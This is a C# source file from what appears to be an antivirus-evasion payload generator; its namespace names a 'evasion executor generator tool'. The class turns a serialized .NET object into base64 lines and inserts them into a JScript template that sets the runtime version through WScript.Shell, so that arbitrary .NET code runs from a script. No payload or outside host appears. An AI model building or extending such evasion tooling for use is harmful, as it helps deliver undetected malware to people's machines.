using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class JScriptGenerator : IScriptGenerator
    {
        static string GetScriptHeader(RuntimeVersion version, bool enable_debug)
        {
            StringBuilder builder = new StringBuilder();
            builder.AppendLine("function setversion() {");
            switch (version)
            {
                case RuntimeVersion.Auto:
                    builder.AppendLine(Global_Var.jscript_auto_version_script);
                    break;
                case RuntimeVersion.v2:
                    builder.AppendLine("new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v2.0.50727';");
                    break;
                case RuntimeVersion.v4:
                    builder.AppendLine("new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';");
                    break;
            }
            builder.AppendLine("}");
            builder.Append("function debug(s) {");
            if (enable_debug)
            {
                builder.Append("WScript.Echo(s);");
            }
            builder.AppendLine("}");
            return builder.ToString();
        }

        public string ScriptName
        {
            get
            {
                return "JScript";
            }
        }

        public bool SupportsScriptlet
        {
            get
            {
                return true;
            }
        }

        public static string[] BinToBase64Lines(byte[] serialized_object)
        {
            int ofs = serialized_object.Length % 3;
            if (ofs != 0)
            {
                int length = serialized_object.Length + (3 - ofs);
                Array.Resize(ref serialized_object, length);
            }

            string base64 = Convert.ToBase64String(serialized_object, Base64FormattingOptions.InsertLineBreaks);
            return base64.Split(new string[] { Environment.NewLine }, StringSplitOptions.None).Select(s => String.Format("\"{0}\"", s)).ToArray();
        }

        public string GenerateScript(byte[] serialized_object, string entry_class_name, string additional_script, RuntimeVersion version, bool enable_debug)
        {
            string[] lines = BinToBase64Lines(serialized_object);

            return GetScriptHeader(version, enable_debug)
                + Global_Var.jscript_template.Replace("%SERIALIZED%", String.Join("+" + Environment.NewLine, lines)).Replace("%CLASS%", entry_class_name).Replace("%ADDEDSCRIPT%", additional_script);
        }
    }
}
